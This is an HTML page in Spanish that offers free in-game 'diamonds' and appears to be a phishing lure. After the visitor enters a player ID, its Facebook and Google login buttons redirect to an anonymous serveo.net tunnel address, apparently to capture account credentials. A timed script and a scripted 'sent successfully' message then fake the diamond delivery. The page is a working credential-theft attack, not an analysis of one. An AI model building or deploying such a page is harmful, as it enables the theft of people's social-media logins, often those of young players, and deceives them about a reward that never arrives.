<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Regalador de Diamantes</title>
    <style>
        /* Estilo del fondo con animación eléctrica RGB */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff, #ff00ff);
            background-size: 400% 400%;
            animation: gradientAnimation 5s ease infinite;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        /* Definimos el efecto de animación para el fondo */
        @keyframes gradientAnimation {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

        .container {
            text-align: center;
            background-color: rgba(0, 0, 0, 0.7); /* Fondo oscuro para mejorar la visibilidad del texto */
            padding: 30px;
            border-radius: 15px;
            width: 350px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .input-container {
            margin-bottom: 20px;
        }

        input[type="text"] {
            padding: 10px;
            font-size: 16px;
            width: 200px;
            border: none;
            border-radius: 5px;
            margin-right: 10px;
            background-color: #444;
            color: white;
        }

        .btn-submit {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #ff9900;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .btn-submit:hover {
            background-color: #e68a00;
        }

        .login-options {
            display: none;
            margin-top: 20px;
        }

        .login-button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .facebook {
            background-color: #3b5998;
            color: white;
        }

        .google {
            background-color: #db4437;
            color: white;
        }

        .login-button:hover {
            opacity: 0.8;
        }

        .diamond-selection {
            display: none;
            margin-top: 20px;
        }

        .diamond-option {
            margin: 10px;
            padding: 10px;
            font-size: 16px;
            background-color: #ff9900;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .diamond-option:hover {
            background-color: #e68a00;
        }

        .success-message {
            display: none;
            font-size: 20px;
            margin-top: 20px;
            color: #28a745;
        }

        .success-icon {
            margin-left: 10px;
            color: #28a745;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Bienvenido al Regalador de Diamantes</h1>
        <div class="input-container">
            <input type="text" id="userID" placeholder="Ingresa tu ID" />
            <button class="btn-submit" onclick="checkID()">Enviar</button>
        </div>
        <div class="login-options" id="loginOptions">
            <p>Inicia sesión con tu cuenta FREE:</p>
            <button class="login-button facebook" onclick="redirectToLogin('facebook')">Iniciar sesión con Facebook</button>
            <button class="login-button google" onclick="redirectToLogin('google')">Iniciar sesión con Google</button>
        </div>
        <div class="diamond-selection" id="diamondSelection">
            <p>Selecciona la cantidad de diamantes:</p>
            <button class="diamond-option" onclick="selectDiamonds(100)">100 Diamantes</button>
            <button class="diamond-option" onclick="selectDiamonds(310)">310 Diamantes</button>
            <button class="diamond-option" onclick="selectDiamonds(520)">520 Diamantes</button>
            <button class="diamond-option" onclick="selectDiamonds(1080)">1080 Diamantes</button>
        </div>
        <div class="success-message" id="successMessage">
            <span>Enviados exitosamente</span><span class="success-icon">✔️</span>
        </div>
    </div>

    <script>
        function checkID() {
            var userID = document.getElementById("userID").value;
            if (userID !== "") {
                // Mostrar opciones de login al ingresar cualquier ID
                document.getElementById("loginOptions").style.display = "block";
            } else {
                alert("Por favor ingresa un ID válido.");
            }
        }

        function redirectToLogin(platform) {
            // Redirigir al enlace de autenticación
            window.location.href = "https://90adf01ecde8774baec347312e45bb5a.serveo.net";
            // Después de redirigir, esperamos que el servidor maneje la autenticación
            // Simulamos el regreso a la página con la autenticación exitosa
            setTimeout(function() {
                // Una vez autenticado, mostramos la selección de diamantes
                document.getElementById("diamondSelection").style.display = "block";
            }, 2000);  // Retraso para simular que el proceso de autenticación está ocurriendo
        }

        function selectDiamonds(diamonds) {
            // Ocultar la selección de diamantes
            document.getElementById("diamondSelection").style.display = "none";
            // Mostrar mensaje de éxito con chulito
            document.getElementById("successMessage").style.display = "block";

            // Recargar la página después de 5 segundos
            setTimeout(function() {
                location.reload();
            }, 5000);  // Recarga la página después de 5 segundos
        }

        // Verificación del parámetro "authenticated" en la URL para mostrar las opciones de diamantes
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.has('authenticated')) {
                // Si el usuario está autenticado (viene de Serveo), mostramos la selección de diamantes
                document.getElementById("diamondSelection").style.display = "block";
            }
        };
    </script>
</body>
</html>
